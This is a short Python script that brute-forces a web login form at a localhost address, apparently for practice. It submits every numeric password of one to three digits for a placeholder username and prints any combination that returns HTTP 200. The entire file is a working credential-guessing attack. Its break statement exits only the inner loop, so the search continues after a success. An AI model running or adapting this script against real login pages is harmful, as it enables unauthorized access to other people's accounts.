#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import itertools
import string

url = 'http://127.0.0.1:5000/login'
Username = "USERNAME"

def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(url, data=payload)
    return response.status_code == 200

# Try different lengths for password
for password_length in range(1, 4):
    for password in itertools.product( string.digits, repeat=password_length):
        password_str = ''.join(password)
        
        print(f"Trying Username: {Username}, Password: {password_str}")
        
        if attempt_login(Username, password_str):
            print(f"Success! Username: {Username}, Password: {password_str}")
            break
